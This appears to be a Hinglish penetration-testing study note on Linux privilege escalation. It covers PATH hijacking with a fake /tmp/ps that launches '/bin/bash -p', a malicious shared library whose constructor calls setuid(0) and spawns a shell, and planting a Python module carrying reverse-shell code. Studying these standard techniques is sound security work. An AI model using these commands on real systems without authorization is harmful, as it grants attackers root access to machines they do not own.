# Linux PrivEsc: Process / Service Hijacking

## 1. Concept 

Jab koi program ya service (jo root se chal rahi hai) kisi dusre program ya script ko call karti hai, toh hum us call ko "hijack" kar sakte hain. Iske do main tarike hote hain:

1. **Relative Path Hijacking:** Program bina full path ke dusri file ko call kar raha ho.
    
2. **Environment Variable Hijacking (`$PATH`):** Hum system ka search path badal dete hain.
    

---

## 2. Environment Variable ($PATH) Hijacking

Ye sabse common method hai. Agar koi root binary kisi command (jaise `ls`, `cat`, `cp`) ko bina full path (`/bin/ls`) ke run karti hai, toh hum use ullu bana sakte hain.

### Step-by-Step Execution:

1. **Identify Vulnerable Binary:** Aisi SUID binary dhundein jo internally kisi command ko call karti ho.
    
    - _Example:_ `shell` naam ki binary `ps` command chala rahi hai.
        
2. **Create Malicious Fake Command:** Hum `/tmp` mein ek nakli `ps` file banayenge:
    
    Bash
    
    ```
    echo "/bin/bash -p" > /tmp/ps
    chmod +x /tmp/ps
    ```
    
3. **Modify $PATH:** System ko bolo ki sabse pehle `/tmp` folder mein check kare:
    
    Bash
    
    ```
    export PATH=/tmp:$PATH
    ```
    
4. **Run Binary:** Ab jab aap wo root binary chalayenge, toh wo asli `/bin/ps` ki jagah aapka `/tmp/ps` chalayegi aur aapko root shell mil jayega.
    

---

## 3. Shared Object (.so) Hijacking / Library Hijacking

Linux programs chalne ke liye external libraries (`.so` files) ka use karte hain. Agar koi library missing hai ya hume uske folder mein write permission hai, toh hum apni library ghusa sakte hain.

### Step-by-Step Execution:

1. **Find Dependencies:** `ldd` command se check karein ki binary kaunsi libraries use kar rahi hai:
    
    Bash
    
    ```
    ldd <binary_name>
    ```
    
2. **Check for Writable Folders:** Check karein ki kya koi library path writable hai.
    
3. **Create Malicious Library:** Ek C file banayein jo execute hote hi shell de:  

   ```
    #include <stdio.h>
    #include <stdlib.h>
    static void inject() __attribute__((constructor));
    void inject() {
        setuid(0);
        system("/bin/bash -p");
    }
   ```




4.  **Compile as Shared Object:**
    ```bash
    gcc -shared -fPIC -o library.so inject.c
    ```


5.  **Replace/Place:** Use sahi location par rakh dein jahan se program use load kare.

---
## 4. Python Library Hijacking
Agar koi root script kisi Python module ko import kar rahi hai aur aap us module ki directory mein likh sakte hain.

*   **Check Python Path:** `python3 -c 'import sys; print(sys.path)'`
*   **Hijack:** Us path mein ek nakli module file (`module_name.py`) bana dein jisme reverse shell code ho. Jab root script chalegi, wo aapka module load karegi.

---
